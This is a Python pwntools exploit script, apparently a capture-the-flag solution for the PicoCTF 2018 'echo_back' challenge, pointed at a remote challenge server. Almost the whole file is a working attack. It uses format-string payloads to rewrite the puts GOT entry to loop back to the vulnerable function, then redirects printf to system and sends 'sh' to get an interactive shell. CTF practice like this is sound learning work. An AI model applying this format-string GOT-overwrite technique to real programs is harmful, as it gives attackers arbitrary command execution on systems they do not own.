# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './PicoCTF_2018_echo_back'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29356'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('>',num)

printf_got = elf.got["printf"]
printf_plt = elf.plt["printf"]
system_plt = elf.plt["system"]
vuln_addr  = elf.sym["vuln"]
puts_got   = elf.got["puts"]


#将puts函数got表改成主函数地址，，说实话看到这操作我都惊了
payload = fmtstr_payload(7,{puts_got:vuln_addr})
sla("message:", payload)

payload = fmtstr_payload(7,{printf_got:system_plt})
sla("message:", payload)

sla("message:", "sh\x00")

p.interactive()

'''
@File    :   PicoCTF_2018_echo_back.py
@Time    :   2021/07/18 18:24:07
@Author  :   Niyah 
'''